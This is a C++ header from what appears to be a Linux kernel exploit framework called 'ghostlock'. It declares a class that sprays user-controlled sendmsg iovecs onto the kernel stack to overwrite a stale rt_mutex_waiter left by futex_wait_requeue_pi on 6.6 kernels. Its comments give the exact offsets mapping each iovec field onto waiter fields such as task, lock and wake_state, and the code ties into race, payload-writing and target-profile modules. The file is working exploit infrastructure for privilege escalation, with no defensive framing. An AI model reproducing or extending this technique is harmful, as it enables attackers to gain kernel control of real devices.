#ifndef SENDMSG_IOVEC_ROUTE_H
#define SENDMSG_IOVEC_ROUTE_H

#include "memory/payload_builder.h"
#include "profile/model.h"
#include "race/pi_race.h"
#include "route/route_status.h"
#include "support/native_resource.hpp"

#include <sys/socket.h>
#include <sys/uio.h>

#include <array>
#include <cstdint>

/* Device-specific middleware for 6.6 images whose stale PI futex waiter sits
 * outside the pselect fd_set window (see select_stack_route.h for that route).
 *
 * __sys_sendmsg keeps UIO_FASTIOV (8) iovecs on its own kernel stack and
 * import_iovec's fast path copies the user array straight into them - no heap.
 * On the adapted image that array overlaps the tail of the stale
 * rt_mutex_waiter left by futex_wait_requeue_pi, so the user iovec values
 * become waiter fields:
 *
 *   iov[0].iov_base -> waiter+0x48 (pi_tree.deadline)
 *   iov[0].iov_len  -> waiter+0x50 (task)
 *   iov[1].iov_base -> waiter+0x58 (lock)
 *   iov[1].iov_len  -> waiter+0x60 (wake_state, low 32 bits)
 *   iov[2].iov_base -> waiter+0x68 (ww_ctx)
 *
 * tree (0x00) and pi_tree (0x28) are unreachable from this buffer, so they keep
 * the live rb nodes the PI walk needs. The iovec bases are never validated by
 * import_iovec, and the later data copy is expected to fail with EFAULT after
 * the waiter has already been stamped. Geometry evidence lives in
 * docs/analysis/sendmsg-iovec-route.md. */
namespace ghostlock::route::sendmsg_iovec {
    /* __sys_sendmsg's on-stack iovec array capacity (UIO_FASTIOV). Exactly this
     * many segments must be passed: more would make import_iovec kmalloc. */
    inline constexpr uint32_t kSendmsgFastIovCount = 8;

    /* Upper bound on re-stamps inside one execute() call. The consumer's own
     * call budget (execution.consumer.max_calls) usually binds first. */
    inline constexpr uint32_t kSendmsgMaxStamps = 4096;

    class SendmsgIovecRoute final {
    public:
        SendmsgIovecRoute(ghostlock::race::PiRace *race,
                          const ghostlock::memory::WriteRequest *request,
                          const ghostlock::profile::TargetProfile &profile) noexcept;

        ~SendmsgIovecRoute() noexcept = default;

        SendmsgIovecRoute(const SendmsgIovecRoute &) = delete;

        SendmsgIovecRoute &operator=(const SendmsgIovecRoute &) = delete;

        SendmsgIovecRoute(SendmsgIovecRoute &&other) noexcept;

        /* Open the transmitting socketpair. No consumer trigger is armed until
         * this returns 0; every failure records step/error_number. */
        [[nodiscard]] int32_t prepare() noexcept;

        /* Stamp the waiter through sendmsg() while the consumer fires. */
        [[nodiscard]] ghostlock::route::RouteStatus execute() noexcept;

        /* Stop the consumer trigger and bounded-drain it; a consumer still in
         * flight marks the route dirty. */
        void disarm() noexcept;

        /* Close the owned socketpair once. */
        void destroy() noexcept;

        [[nodiscard]] int32_t fail(int32_t step, int32_t error_number) noexcept;

        ghostlock::race::PiRace *race = nullptr;
        const ghostlock::memory::WriteRequest *request = nullptr;
        const ghostlock::profile::TargetProfile &profile;
        ghostlock::support::UniqueFd sock_read;
        ghostlock::support::UniqueFd sock_write;
        int32_t consumer_stuck = 0;
        int32_t calls = 0;
        int32_t successes = 0;
        int32_t stamps = 0;
        int32_t send_result = 0;
        int32_t send_errno = 0;
        ghostlock::route::RouteStatus status{};
    };
} // namespace ghostlock::route::sendmsg_iovec

#endif
